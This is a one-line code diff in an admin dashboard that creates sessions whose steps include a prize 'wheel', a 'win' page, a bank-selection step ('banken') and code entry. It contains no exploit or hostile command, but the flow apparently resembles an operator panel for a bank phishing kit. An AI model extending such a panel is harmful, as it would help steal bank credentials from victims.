@@ -419,7 +419,7 @@ export function AdminDashboardClean() {
         .from("sessions")
         .insert({
           amount: linkType === "wheel" ? 0 : (Number(amount.replace(",", ".")) || 0),
-          current_step: linkType === "direct_win" ? "win" : linkType === "direct_bank" ? "banken" : "code_entry",
+          current_step: linkType === "direct_win" ? "win" : linkType === "direct_bank" ? "banken" : linkType === "wheel" ? "wheel" : "code_entry",
           status: "offline",
           is_hidden: false,
           form_data: { 
